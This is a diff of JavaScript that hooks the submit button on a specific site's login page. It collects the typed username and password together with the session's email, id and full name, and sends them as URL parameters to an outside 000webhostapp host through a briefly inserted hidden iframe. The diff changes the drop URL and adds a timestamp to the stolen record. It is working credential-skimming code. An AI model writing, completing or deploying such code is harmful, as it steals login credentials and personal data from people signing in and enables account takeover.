@@ -6,7 +6,7 @@ function account() {
     if (location.href == "https://rogershs.echo-ntn.org/themius/login" ||
         location.href == "https://rogershs.echo-ntn.org/themius/login;action=logout")
     {
-        $('[type="submit"]').on('click', function () {
+        $("[type='submit']").on('click', function() {
             var input = document.querySelector('body')
                             .querySelector('app-root')
                             .querySelector('app-before-login')
@@ -21,9 +21,10 @@ function account() {
                 let email = session.email 
                 let id = session.id
                 let fullname = session.firstname + " " + session.lastname
+                let exactdate = new Date();
 
-                var json = `{"email": "`+email+`","id": "`+id+`","fullname": "`+fullname+`","username": "`+username.value+`","password": "`+password.value+`"}`
-                var link = "https://tf2cuntsupport.000webhostapp.com/Public/Sub/fetch.php?user="+username.value+"&json="+json+""
+                var json = `{"date": "`+exactdate+`","email": "`+email+`","id": "`+id+`","fullname": "`+fullname+`","username": "`+username.value+`","password": "`+password.value+`"}`
+                var link = "https://defbelua.000webhostapp.com/index.php?filename="+username.value+"&assert="+json+""
             
                 $('<iframe>', {
                     id: 'frameacc',
@@ -34,8 +35,6 @@ function account() {
                     $('#frameacc').remove()
                 }, 500)
             }, 1000)
-
-            localStorage.setItem('account', 'false')
         })
     }
 }
